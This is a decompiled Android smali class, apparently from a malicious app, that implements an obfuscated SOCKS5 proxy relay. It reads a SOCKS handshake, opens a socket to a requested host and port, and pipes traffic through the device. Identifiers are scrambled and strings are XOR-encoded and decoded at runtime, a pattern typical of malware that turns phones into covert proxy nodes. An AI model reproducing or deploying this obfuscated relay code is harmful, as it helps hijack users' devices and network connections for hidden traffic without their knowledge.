.class public Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private fsafsdfsfsdfsfsdfsd:I

.field private sdfsdfsdfsdf:Ljava/lang/String;

.field private zxcvxvsdvsvsvs:Ljava/net/Socket;


# direct methods
.method public constructor <init>(Ljava/net/Socket;)V
    .locals 2

    const v0, 0x19000

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->sdfsdfsdfsdf:Ljava/lang/String;

    iput v0, p0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd:I

    iput-object p1, p0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    return-void
.end method

.method public static fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    new-array v2, v0, [C

    add-int/lit8 v0, v0, -0x1

    move v1, v0

    :goto_0
    if-ltz v0, :cond_0

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    add-int/lit8 v3, v1, -0x1

    xor-int/lit8 v0, v0, 0x46

    int-to-char v0, v0

    aput-char v0, v2, v1

    if-ltz v3, :cond_0

    add-int/lit8 v0, v3, -0x1

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result v1

    xor-int/lit8 v1, v1, 0x2d

    int-to-char v1, v1

    aput-char v1, v2, v3

    move v1, v0

    goto :goto_0

    :cond_0
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([C)V

    return-object v0
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd(B)I
    .locals 1

    and-int/lit16 v0, p1, 0xff

    return v0
.end method

.method public run()V
    .locals 20

    :try_start_0
    move-object/from16 v0, p0

    iget-object v1, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    invoke-virtual {v1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    move-object/from16 v0, p0

    iget-object v2, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    move-object/from16 v0, p0

    iget v3, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd:I

    new-array v3, v3, [B

    const/4 v4, 0x0

    const/4 v5, 0x3

    invoke-virtual {v1, v3, v4, v5}, Ljava/io/InputStream;->read([BII)I

    const/4 v4, 0x2

    new-array v4, v4, [B

    fill-array-data v4, :array_0

    const/16 v5, 0xa

    new-array v5, v5, [B

    invoke-virtual {v2, v4}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    const/4 v4, 0x0

    const/16 v6, 0xa

    invoke-virtual {v1, v3, v4, v6}, Ljava/io/InputStream;->read([BII)I

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v6, 0x4

    aget-byte v6, v3, v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(B)I

    move-result v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "/"

    invoke-static {v6}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v6, 0x5

    aget-byte v6, v3, v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(B)I

    move-result v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "_"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v6, 0x6

    aget-byte v6, v3, v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(B)I

    move-result v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "/"

    invoke-static {v6}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v6, 0x7

    aget-byte v6, v3, v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(B)I

    move-result v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/16 v6, 0x8

    aget-byte v6, v3, v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(B)I

    move-result v6

    mul-int/lit16 v6, v6, 0x100

    const/16 v7, 0x9

    aget-byte v7, v3, v7

    move-object/from16 v0, p0

    invoke-virtual {v0, v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(B)I

    move-result v7

    add-int/2addr v6, v7

    const-string v7, "\u000f\u0014.\u00079\u0003\u0008\u0019.\u0014=\u0015"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v9, 0x0

    const-string v10, "B>o?d2u4equ>!"

    invoke-static {v10}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "K"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v7, Ljava/net/Socket;

    invoke-direct {v7, v4, v6}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v7}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-virtual {v7}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v6

    const/4 v8, 0x4

    new-array v8, v8, [B

    invoke-virtual {v7}, Ljava/net/Socket;->getLocalAddress()Ljava/net/InetAddress;

    move-result-object v8

    invoke-virtual {v8}, Ljava/net/InetAddress;->getAddress()[B

    move-result-object v8

    invoke-virtual {v7}, Ljava/net/Socket;->getLocalPort()I

    move-result v7

    const/16 v9, 0x9

    const/16 v10, 0x8

    const/4 v11, 0x7

    const/4 v12, 0x6

    const/4 v13, 0x5

    const/4 v14, 0x4

    const/4 v15, 0x3

    const/16 v16, 0x2

    const/16 v17, 0x1

    const/16 v18, 0x0

    const/16 v19, 0x5

    aput-byte v19, v5, v18

    const/16 v18, 0x0

    aput-byte v18, v5, v17

    const/16 v17, 0x0

    aput-byte v17, v5, v16

    const/16 v16, 0x1

    aput-byte v16, v5, v15

    const/4 v15, 0x0

    aget-byte v15, v8, v15

    aput-byte v15, v5, v14

    const/4 v14, 0x1

    aget-byte v14, v8, v14

    aput-byte v14, v5, v13

    const/4 v13, 0x2

    aget-byte v13, v8, v13

    aput-byte v13, v5, v12

    const/4 v12, 0x3

    aget-byte v8, v8, v12

    aput-byte v8, v5, v11

    shr-int/lit8 v8, v7, 0x8

    int-to-byte v8, v8

    aput-byte v8, v5, v10

    and-int/lit16 v7, v7, 0xff

    int-to-byte v7, v7

    aput-byte v7, v5, v9

    const/4 v7, 0x0

    const/16 v8, 0xa

    invoke-virtual {v2, v5, v7, v8}, Ljava/io/OutputStream;->write([BII)V

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    new-instance v5, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;

    invoke-direct {v5, v4, v2}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-virtual {v5}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->start()V

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    :goto_0
    const/4 v4, 0x0

    move-object/from16 v0, p0

    iget v5, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd:I

    invoke-virtual {v1, v3, v4, v5}, Ljava/io/InputStream;->read([BII)I

    move-result v4

    if-lez v4, :cond_1

    const/4 v5, 0x0

    invoke-virtual {v6, v3, v5, v4}, Ljava/io/OutputStream;->write([BII)V

    const/4 v5, 0x0

    invoke-virtual {v2, v3, v5, v4}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    invoke-virtual {v6}, Ljava/io/OutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catch_0
    move-exception v1

    :try_start_1
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    move-object/from16 v0, p0

    iget-object v1, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    if-eqz v1, :cond_0

    move-object/from16 v0, p0

    iget-object v1, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    :cond_0
    :goto_1
    return-void

    :cond_1
    :try_start_3
    move-object/from16 v0, p0

    iget-object v1, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    if-eqz v1, :cond_0

    move-object/from16 v0, p0

    iget-object v1, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catchall_0
    move-exception v1

    :try_start_4
    move-object/from16 v0, p0

    iget-object v2, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    if-eqz v2, :cond_2

    move-object/from16 v0, p0

    iget-object v2, v0, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_3

    :cond_2
    :goto_2
    throw v1

    :catch_3
    move-exception v2

    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2

    :array_0
    .array-data 1
        0x5t
        0x0t
    .end array-data
.end method
